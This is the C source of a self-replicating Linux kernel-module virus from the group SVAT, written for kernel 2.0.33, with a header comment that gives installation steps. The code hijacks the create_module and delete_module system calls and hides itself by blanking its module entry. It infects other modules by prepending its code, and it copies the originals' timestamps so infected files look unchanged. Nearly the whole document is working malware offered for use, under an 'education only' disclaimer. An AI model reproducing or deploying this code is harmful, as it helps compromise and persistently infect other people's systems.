/* 		SVAT - Special Virii And Trojans - present:
 *
 * -=-=-=-=-=-=- the k0dy-projekt, virii phor unix systems -=-=-=-=-=-=-=-
 *
 * 0kay guys, here we go...
 * As i told you with VLP I (we try to write an fast-infector)
 * here's the result:
 * a full, non-overwriting module infector that catches
 * lkm's due to create_module() and infects them (max. 7)
 * if someone calls delete_module() [even on autoclean].
 * Linux is not longer a virii-secure system :(
 * and BSD follows next week ...
 * Since it is not needed 2 get root (by the module) you should pay
 * attention on liane.
 * Note the asm code in function init_module().
 * U should assemble your /usr/src/.../module.c with -S and your CFLAG
 * from your Makefile and look for the returnvalue from the first call
 * of find_module() in sys_init_module(). look where its stored (%ebp for me)
 * and change it in __asm__ init_module()! (but may it is not needed)
 *
 * For education only! 
 * Run it only with permisson of the owner of the system you are logged on!!! 
 * 
 * 		!!! YOU USE THIS AT YOUR OWN RISK !!!
 *
 * I'm not responsible for any damage you maybe get due to playing around with this. 
 *
 * okay guys, you have to find out some steps without my help:
 *
 * 	1. $ cc -c -O2 module.c
 *	2. get length of module.o and patch the #define MODLEN in module.c
 *	3. $ ???
 *   	4. $ cat /lib/modules/2.0.33/fs/fat.o >> module.o 
 *	5. $ mv module.o /lib/modules/2.0.33/fs/fat.o
 *	>AND NOW, IF YOU REALLY WANT TO START THE VIRUS:< 
 *	6. $ insmod ???
 * 
 * This lkm-virus was tested on a RedHat 4.0 system with 80486-CPU and
 * kernel 2.0.33. It works.
 *
 * 	greets  (in no order...)
 * 	<><><><><><><><><><><><>
 *
 * 	NetW0rker	- tkx for da sources
 *	Serialkiller	- gib mir mal deine eMail-addy
 *	hyperSlash	- 1st SVAT member, he ?
 *	naleZ 		- hehehe
 *	MadMan		- NetW0rker wanted me to greet u !?
 *	KilJaeden	- TurboDebugger and SoftIce are a good choice !
 *
 *	and all de otherz
 *
 *	Stealthf0rk/SVAT <stealth@cyberspace.org>
 */

#define __KERNEL__
#define MODULE
#define MODLEN 6196
#define ENOUGH 7
#define BEGIN_KMEM {unsigned long old_fs=get_fs();set_fs(get_ds());
#define END_KMEM   set_fs(old_fs);}


/* i'm not sure we need all of 'em ...*/

#include <linux/version.h>
#include <linux/mm.h>
#include <linux/unistd.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <asm/errno.h>
#include <asm/string.h>
#include <linux/fcntl.h>
#include <sys/syscall.h>
#include <linux/module.h>
#include <linux/malloc.h>
#include <linux/kernel.h>
#include <linux/kerneld.h>

#define __NR_our_syscall 211
#define MAXPATH 30
/*#define DEBUG*/
#ifdef DEBUG
   #define DPRINTK(format, args...) printk(KERN_INFO format,##args)
#else
   #define DPRINTK(format, args...)
#endif

/* where the sys_calls are */

extern void *sys_call_table[];

/* tested only with kernel 2.0.33, but thiz should run under 2.x.x
 * if you change the default_path[] values 
 */

static char *default_path[] = {
	".", "/linux/modules",
	"/lib/modules/2.0.33/fs",
	"/lib/modules/2.0.33/net",
	"/lib/modules/2.0.33/scsi",
	"/lib/modules/2.0.33/block",
	"/lib/modules/2.0.33/cdrom",
	"/lib/modules/2.0.33/ipv4",
	"/lib/modules/2.0.33/misc",
	"/lib/modules/default/fs",
	"/lib/modules/default/net",
	"/lib/modules/default/scsi",
	"/lib/modules/default/block",
	"/lib/modules/default/cdrom",
	"/lib/modules/default/ipv4",
	"/lib/modules/default/misc",
	"/lib/modules/fs",
	"/lib/modules/net",
	"/lib/modules/scsi",
	"/lib/modules/block",
	"/lib/modules/cdrom",
	"/lib/modules/ipv4",
	"/lib/modules/misc",
	0
};

static struct symbol_table my_symtab = {
   	#include <linux/symtab_begin.h>
   	X(printk),
        X(vmalloc),
        X(vfree),
        X(kerneld_send),
        X(current_set),
        X(sys_call_table),
        X(register_symtab_from),
        #include <linux/symtab_end.h>
};

char files2infect[7][60 + 2];

/* const char kernel_version[] = UTS_RELEASE; */

int (*old_create_module)(char*, int);
int (*old_delete_module)(char *);
int (*open)(char *, int, int);
int (*close)(int);
int (*unlink)(char*);

int our_syscall(int);
int infectfile(char *);
int is_infected(char *);
int cp(struct file*, struct file*);
int writeVir(char *, char *);
int init_module2(struct module*);
char *get_mod_name(char*);

/* needed to be global */

void *VirCode = NULL;

/* install new syscall to see if we are already in kmem */
int our_syscall(int mn)
{
   	/* magic number: 40hex :-) */
   	if (mn == 0x40)
           	return 0;
        else
           	return -ENOSYS;
}

int new_create_module(char *name, int size)
{
   	int i = 0, j = 0, retval = 0;
        
        if ((retval = old_create_module(name, size)) < 0)
           	return retval;
        /* find next free place */
        for (i = 0; files2infect[i][0] && i < 7; i++);
        if (i == 6)
           	return retval;
        /* get name of mod from user-space */
        while ((files2infect[i][j] = get_fs_byte(name + j)) != 0 && j < 60)
           	j++;
	DPRINTK("in new_create_module: got %s as #%d\n", files2infect[i], i);
        return retval;
}

/* we infect modules after sys_delete_module, to be sure
 * we don't confuse the kernel
 */

int new_delete_module(char *modname)
{
   	static int infected = 0;
	int retval = 0, i = 0;
        char *s = NULL, *name = NULL;
        
        
        retval = old_delete_module(modname); 

        if ((name = (char*)vmalloc(MAXPATH + 60 + 2)) == NULL)
           	return retval;

   	for (i = 0; files2infect[i][0] && i < 7; i++) {
           	strcat(files2infect[i], ".o"); 
                if ((s  = get_mod_name(files2infect[i])) == NULL) {
                   	return retval;
                }
                name = strcpy(name, s);
                if (!is_infected(name)) {
                   	DPRINTK("try 2 infect %s as #%d\n", name, i);
                        infected++;
                        infectfile(name);
                }
                memset(files2infect[i], 0, 60 + 2);
        } /* for */
        /* its enough */
        if (infected >= ENOUGH)
           	cleanup_module();
        vfree(name);
        return retval;
}


/* lets take a look at sys_init_module(), that calls
 * our init_module() compiled with
 * CFLAG = ... -O2 -fomit-frame-pointer
 * in C:
 * ...
 * if((mp = find_module(name)) == NULL)
 * ...
 *
 * is in asm:
 * ...
 * call find_module
 * movl %eax, %ebp
 * ...
 * note that there is no normal stack frame !!!
 * thats the reason, why we find 'mp' (return from find_module) in %ebp
 * BUT only when compiled with the fomit-frame-pointer option !!!
 * with a stackframe (pushl %ebp; movl %esp, %ebp; subl $124, %esp)
 * you should find mp at -4(%ebp) .
 * thiz is very bad hijacking of local vars and an own topic.
 * I hope you do not get an seg. fault.
 */

__asm__ 
("

.align 16
.globl init_module	
   .type init_module,@function

init_module:
        pushl %ebp		 /* ebp is a pointer to mp from sys_init_module() */
                        	 /* and the parameter for init_module2() */
        call init_module2    	 
        popl %eax
        xorl %eax, %eax		 /* all good */
        ret	                 /* and return */
.hype27:
   	.size init_module,.hype27-init_module
");
        
 /* for the one with no -fomit-frame-pointer and no -O2 this should (!) work:
  *
  * pushl %ebx
  * movl %ebp, %ebx
  * pushl -4(%ebx)
  * call init_module2
  * addl $4, %esp
  * xorl %eax, %eax
  * popl %ebx
  * ret
  */

/*----------------------------------------------*/

int init_module2(struct module *mp)
{       
        char *s = NULL, *mod = NULL, *modname = NULL;
        long state = 0;
   
      	mod = vmalloc(60 + 2);
	modname = vmalloc(MAXPATH + 60 + 2);
        if (!mod || !modname)
           	return -1;        
        strcpy(mod, mp->name);
        strcat(mod, ".o");

   	
        MOD_INC_USE_COUNT;        
        DPRINTK("in init_module2: mod = %s\n", mod);
        
        /* take also a look at phrack#52 ...*/
        mp->name = "";
        mp->ref = 0;
        mp->size = 0;

        /* thiz is our new main ,look for copys in kmem ! */
        if (sys_call_table[__NR_our_syscall] == 0) {    
		old_delete_module = sys_call_table[__NR_delete_module];  
                old_create_module = sys_call_table[__NR_create_module];
                sys_call_table[__NR_our_syscall] = (void*)our_syscall;  		
                sys_call_table[__NR_delete_module] = (void*)new_delete_module;         
                sys_call_table[__NR_create_module] = (void*)new_create_module;
                memset(files2infect, 0, (60 + 2)*7);
                register_symtab(&my_symtab);
        }
        register_symtab(0);
        open = sys_call_table[__NR_open]; 
        close = sys_call_table[__NR_close];        
        unlink = sys_call_table[__NR_unlink];        
        
        if ((s = get_mod_name(mod)) == NULL)
           	return -1;
        modname = strcpy(modname, s);
	load_real_mod(modname, mod);
	vfree(mod);
        vfree(modname);
	return 0;
}        

int cleanup_module()
{
	sys_call_table[__NR_delete_module] = old_delete_module;
        sys_call_table[__NR_create_module] = old_create_module;
        sys_call_table[__NR_our_syscall] = NULL;
        DPRINTK("in cleanup_module\n");
        vfree(VirCode);
        return 0;
}

/* returns 1 if infected; 
 * seek at position MODLEN + 1 and read out 3 bytes,
 * if it is "ELF" it seems the file is already infected
 */

int is_infected(char *filename) 
{
   	char det[4] = {0};
        int fd = 0;
        struct file *file;

        DPRINTK("in is_infected: filename = %s\n", filename);
   	BEGIN_KMEM
        fd = open(filename, O_RDONLY, 0); 
        END_KMEM
        if (fd <= 0)
           	return -1;
        if ((file = current->files->fd[fd]) == NULL)
           	return -2;
        file->f_pos = MODLEN + 1;
        DPRINTK("in is_infected: file->f_pos = %d\n", file->f_pos);
        BEGIN_KMEM
        file->f_op->read(file->f_inode, file, det, 3);
        close(fd);
        END_KMEM
        DPRINTK("in is_infected: det = %s\n", det);
        if (strcmp(det, "ELF") == 0)
           	return 1;
        else
           	return 0;
}

/* copy the host-module to tmp, write VirCode to
 * hostmodule, and append tmp.
 * then delete tmp.
 */


int infectfile(char *filename)
{
        char *tmp = "/tmp/t000";
        int in = 0, out = 0;
        struct file *file1, *file2;
        
        BEGIN_KMEM
        in = open(filename, O_RDONLY, 0640);
        out = open(tmp, O_RDWR|O_TRUNC|O_CREAT, 0640);
        END_KMEM
        DPRINTK("in infectfile: in = %d out = %d\n", in, out);
        if (in <= 0 || out <= 0)
           	return -1;
        file1 = current->files->fd[in];
        file2 = current->files->fd[out];
        if (!file1 || !file2)
           	return -1;
        /* save hostcode */
        cp(file1, file2);
        BEGIN_KMEM
        file1->f_pos = 0;
        file2->f_pos = 0;
        /* write Vircode [from mem] */
        DPRINTK("in infetcfile: filenanme = %s\n", filename);
        file1->f_op->write(file1->f_inode, file1, VirCode, MODLEN);
        /* append hostcode */
        cp(file2, file1);
        close(in);
        close(out);
        unlink(tmp);
        END_KMEM
   	return 0;
}        

int disinfect(char *filename)
{

	char *tmp = "/tmp/t000";
        int in = 0, out = 0;
        struct file *file1, *file2;
        
        BEGIN_KMEM
        in = open(filename, O_RDONLY, 0640);
        out = open(tmp, O_RDWR|O_TRUNC|O_CREAT, 0640);
        END_KMEM
        DPRINTK("in disinfect: in = %d out = %d\n",in, out);
        if (in <= 0 || out <= 0)
           	return -1;
        file1 = current->files->fd[in];
        file2 = current->files->fd[out];
        if (!file1 || !file2)
           	return -1;
        /* save hostcode */
        cp(file1, file2);
	BEGIN_KMEM
 	close(in);
        DPRINTK("in disinfect: filename = %s\n", filename); 
        unlink(filename);
	in = open(filename, O_RDWR|O_CREAT, 0640);
	END_KMEM
	if (in <= 0)
		return -1;
	file1 = current->files->fd[in];
	if (!file1)
           	return -1;
        file2->f_pos = MODLEN;
	cp(file2, file1);
	BEGIN_KMEM
	close(in);
	close(out);
	unlink(tmp);
	END_KMEM
	return 0;
}

/* a simple copy routine, that expects the file struct pointer
 * of the files to be copied.
 * So its possible to append files due to copieng.
 */

int cp(struct file *file1, struct file *file2)
{

   	int in = 0, out = 0, r = 0;
        char *buf;
        
        if ((buf = (char*)vmalloc(10000)) == NULL)
           	return -1;

        DPRINTK("in cp: f_pos = %d\n", file1->f_pos);
        BEGIN_KMEM
        while ((r = file1->f_op->read(file1->f_inode, file1, buf, 10000)) > 0)
           	file2->f_op->write(file2->f_inode, file2, buf, r);
        file2->f_inode->i_mode = file1->f_inode->i_mode;
        file2->f_inode->i_atime = file1->f_inode->i_atime;
        file2->f_inode->i_mtime = file1->f_inode->i_mtime;
        file2->f_inode->i_ctime = file1->f_inode->i_ctime;
        END_KMEM
        vfree(buf);
        return 0;
}

/* Is that simple: we disinfect the module [hide 'n seek]
 * and send a request to kerneld to load
 * the orig mod. N0 fuckin' parsing for symbols and headers
 * is needed - cool.
 */
int load_real_mod(char *path_name, char *name)
{   	
        int r = 0, i = 0;		
        struct file *file1, *file2;
        int in =  0, out = 0; 

        DPRINTK("in load_real_mod name = %s\n", path_name);
        if (VirCode)
           	vfree(VirCode);
        VirCode = vmalloc(MODLEN);
        if (!VirCode)
                return -1;
        BEGIN_KMEM
        in = open(path_name, O_RDONLY, 0640);
        END_KMEM
	if (in <= 0)
           	return -1;
        file1 = current->files->fd[in];
        if (!file1)
              	return -1;
        /* read Vircode [into mem] */
	BEGIN_KMEM
        file1->f_op->read(file1->f_inode, file1, VirCode, MODLEN);
	close(in);
	END_KMEM
	disinfect(path_name);
        r = request_module(name);
        DPRINTK("in load_real_mod: request_module = %d\n", r);
        return 0;
}   	
        
char *get_mod_name(char *mod)
{
	int fd = 0, i = 0;
	static char* modname = NULL;
	
	if (!modname)
		modname = vmalloc(MAXPATH + 60 + 2);
	if (!modname)
		return NULL;
	BEGIN_KMEM
        for (i = 0; (default_path[i] && (strstr(mod, "/") == NULL)); i++) {
		memset(modname, 0, MAXPATH + 60 + 2);
		modname = strcpy(modname, default_path[i]);
		modname = strcat(modname, "/");
                modname = strcat(modname, mod);
		if ((fd = open(modname, O_RDONLY, 0640)) > 0) 
			break;
        }
        close(fd);
        END_KMEM    
        if (!default_path[i])
           	return NULL;  
	return modname;	
}        	        
